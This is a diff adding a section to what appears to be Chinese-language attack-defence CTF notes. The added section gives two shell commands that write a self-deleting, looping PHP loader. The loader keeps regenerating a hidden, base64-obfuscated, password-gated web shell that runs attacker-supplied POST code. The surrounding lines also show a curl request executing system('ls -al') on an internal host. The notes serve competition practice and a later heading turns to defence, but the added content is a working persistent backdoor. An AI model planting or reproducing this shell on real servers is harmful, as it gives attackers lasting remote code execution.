@@ -275,6 +275,14 @@ POST：
 curl http://172.16.2.234:8011/index.php --data "2=v5est0r&1=system('ls -al')"
 ```
 
+命令执行写不死马：
+```
+echo -e '<?php unlink(".1.php");ignore_user_abort(true);set_time_limit(0);$code="PD9waHAgJG09ImFzIi4icyIuImVydCI7aWYgKG1kNSgkX1BPU1RbMl0pPT09JzEwOTcyZDcxOGMyMWZkYzg3MThlZmJhYThlNjc3NDBlJyl7JG0oJF9QT1NUWzFdKTt9Pz4=";while(1){file_put_contents(".index1.php",base64_decode($code));system("chmod 755 .index1.php");sleep(0); }?>' > .1.php
+```
+```
+echo -e PD9waHAgdW5saW5rKCIuMS5waHAiKTtpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTtzZXRfdGltZV9saW1pdCgwKTsKJGNvZGU9IlBEOXdhSEFnSkcwOUltRnpJaTRpY3lJdUltVnlkQ0k3YVdZZ0tHMWtOU2drWDFCUFUxUmJNbDBwUFQwOUp6RXdPVGN5WkRjeE9HTXlNV1prWXpnM01UaGxabUpoWVRobE5qYzNOREJsSnlsN0pHMG9KRjlRVDFOVVd6RmRLVHQ5UHo0PSI7Ci8qCjw/cGhwICRtPSJhcyIuInMiLiJlcnQiO2lmIChtZDUoJF9QT1NUWzJdKT09PScxMDk3MmQ3MThjMjFmZGM4NzE4ZWZiYWE4ZTY3NzQwZScpeyRtKCRfUE9TVFsxXSk7fT8+CiovCndoaWxlKDEpewpmaWxlX3B1dF9jb250ZW50cygiLmluZGV4LnBocCIsYmFzZTY0X2RlY29kZSgkY29kZSkpOwpzeXN0ZW0oImNobW9kIDc1NSAuaW5kZXgucGhwIik7CnNsZWVwKDApOyAKfQo/Pg==|base64 -d > .1.php
+```
+
 
 ### 对抗不死马
 根据日志发现攻击日志。
